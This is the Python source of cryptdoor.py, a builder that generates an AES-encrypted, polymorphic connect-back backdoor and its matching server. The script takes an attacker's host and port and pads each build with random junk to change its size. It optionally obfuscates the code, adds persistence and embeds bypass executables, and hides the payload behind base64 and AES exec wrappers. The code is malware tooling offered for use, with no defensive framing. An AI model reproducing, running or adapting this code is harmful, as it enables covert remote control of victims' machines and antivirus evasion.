#!/usr/bin/env python
#
# cryptdoor.py - AES encrypted polymorphic backdoor
# by @d4rkcat github.com/d4rkcat
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

from Crypto.Cipher import AES
import base64, random, string, sys, os, argparse, subprocess

def randKey(bytes):
	return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))

def randVar():
	return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(random.choice("0123456789") for x in range(3))

parser = argparse.ArgumentParser(prog='cryptdoor', usage='./cryptdoor.py [options]')
parser.add_argument('-i', "--hostname", type=str, help='Ip or hostname to connect back to.')
parser.add_argument("-p", "--port", type=str, help="Port.")
parser.add_argument('-o', "--obfuscate", action="store_true", help='Enable Obfuscation of source code.')
parser.add_argument('-a', "--persistence", action="store_true", help='Enable Auto-persistence.')
parser.add_argument('-x', "--proxy", action="store_true", help='Enable HTTP proxy connect.')
parser.add_argument('-b', "--backdoorname", type=str, help='Name of backdoor (default backdoor.py).')
parser.add_argument('-s', "--servername", type=str, help='Name of server (default server.py).')
args = parser.parse_args()

if len(sys.argv) == 1:
	parser.print_help()
	exit()

if args.hostname and args.port:
	hostname = args.hostname
	portnumber = args.port
else:
	parser.print_help()
	exit()

if args.backdoorname:
	backdoorName = args.backdoorname
else:
	backdoorName = "backdoor.py"

if args.servername:
	serverName = args.servername
else:
	serverName = "server.py"

if args.proxy:
	proxysetting = 'useproxy = True'
else:
	proxysetting = 'useproxy = False'

BLOCK_SIZE, PADDING = 32, '{'
pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
key, iv, secretkey = randKey(32), randKey(16), randKey(32)
be64var, bd64var, AESvar = randVar(), randVar(), randVar()
triplequote = "'" * 3
lswinservices = triplequote + '''for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a''' + triplequote
junk = randVar() + ' = "' + ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for x in range(random.randint(1,25000))) + '"'  # Add a random amount of random shit to make sure the size is always different.
junk2 = randVar() + ' = "' + ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for x in range(random.randint(1,25000))) + '"'  # Add a random amount of random shit to make sure the size is always different.

if args.persistence:
	persistpart = '''
	else:
		if isAdmin and platform.uname()[2] == '7':
			fpersist()
'''
	print ' [*] Auto-persistence enabled.'
else:
	persistpart = ' '

with open('base64/86', 'rb') as exe86:
	bypass86 = "bypass86exe = '%s'" % (exe86.read())

with open('base64/64', 'rb') as exe64:
	bypass64 = "bypass64exe = '%s'" % (exe64.read())

with open('stubs/backdoor.py', 'rb') as finalbackdoor:
	readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***WINSERVICES***', lswinservices).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2)

if args.obsfuscate:
	with open('tempobfs.py', 'wb') as o:
		o.write(readyscript)
	obstime = subprocess.Popen('python pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	readyscript = obstime.stdout.read()
	os.remove('tempobfs.py')

cipher = AES.new(key)
encrypted = EncodeAES(cipher, readyscript)

myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests']
myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var)]
mywindows = ['win32crypt', 'pyHook', 'pythoncom', 'win32api', 'win32gui', 'win32ui', 'win32con']

if args.proxy:
	mywindows.append('socks')
	
random.shuffle(myimports)
random.shuffle(myendings)
random.shuffle(mywindows)

with open(backdoorName, 'w') as f:
	f.write('#!/usr/bin/env python\nimport ')
	f.write(",".join(myimports) + "\n")
	f.write(";".join(myendings) + "\n")
	f.write('try:\n	import ')
	f.write(",".join(mywindows) + "\n")
	f.write('except:\n	pass\n')
	f.write("exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,encrypted))))

with open('stubs/server.py', 'rb') as rawserv:
	finalserver = rawserv.read().replace('**n', '\\n').replace('**r', '\\r').replace('***SECRET***', secretkey).replace('***PORT***', portnumber)

with open(serverName, 'wb') as se:
	se.write(finalserver)

if os.name == 'posix':
	os.system('chmod +x %s %s' % (backdoorName, serverName))
print " [*] Backdoor written to %s\n [*] Server written to %s" % (backdoorName, serverName)
